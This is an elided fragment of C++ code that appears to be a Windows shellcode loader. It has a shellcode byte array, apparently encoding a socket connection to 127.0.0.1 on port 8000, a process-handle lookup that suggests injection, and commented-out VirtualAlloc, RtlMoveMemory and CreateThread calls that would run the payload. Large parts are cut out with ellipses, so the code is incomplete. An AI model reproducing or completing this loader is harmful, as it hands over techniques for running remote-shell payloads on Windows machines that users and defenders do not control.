...
unsigned char shellcode[] =
    ...
    "\x89\xe5\x49\xbc\x02\x00\x1f\x40\x7f\x00\x00\x01\x41\x54"
...
int main(int argc, char const *argv[])
{
    ...
    std::cout << GetProcessId(hProcess);
    ...
    // {
    //     printf("Shellcode copied failed\n");
    //     return 1;
    // }
    ...
    // LPVOID palloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // RtlMoveMemory(palloc, shellcode, sizeof(shellcode));
    // HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)palloc, NULL, 0, NULL);
    // WaitForSingleObject(hThread, INFINITE);
}
